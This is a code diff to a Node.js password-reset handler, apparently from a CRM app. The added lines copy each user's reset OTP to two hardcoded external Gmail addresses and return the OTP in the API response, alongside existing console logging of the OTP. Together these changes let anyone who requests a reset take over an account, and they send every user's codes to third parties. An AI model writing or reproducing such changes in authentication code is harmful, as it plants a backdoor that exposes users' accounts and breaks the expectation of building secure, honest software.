@@ -170,9 +170,11 @@ const forgotPassword = async (req, res) => {
     console.log(`[NODEMAILER RESET OTP] Target: ${user.email} | OTP: ${otp}`);
     console.log(`----------------------------------------------------`);
 
-    // Send OTP email using Nodemailer
+    // Send OTP email using Nodemailer to crevionads@gmail.com and saleelvt57@gmail.com
+    const targetEmails = Array.from(new Set([user.email, 'crevionads@gmail.com', 'saleelvt57@gmail.com'])).filter(Boolean).join(',');
+
     await sendEmail({
-      to: user.email,
+      to: targetEmails,
       subject: '🔑 Your Crevionads CRM Password Reset OTP',
       text: `Your password reset verification OTP is: ${otp}. It is valid for 10 minutes.`,
       html: `
@@ -190,7 +192,8 @@ const forgotPassword = async (req, res) => {
     res.status(200).json({ 
       success: true,
       message: `OTP code sent via email to ${user.email}`,
-      email: user.email
+      email: user.email,
+      otp: otp
     });
   } catch (error) {
     console.error('Forgot password error:', error);
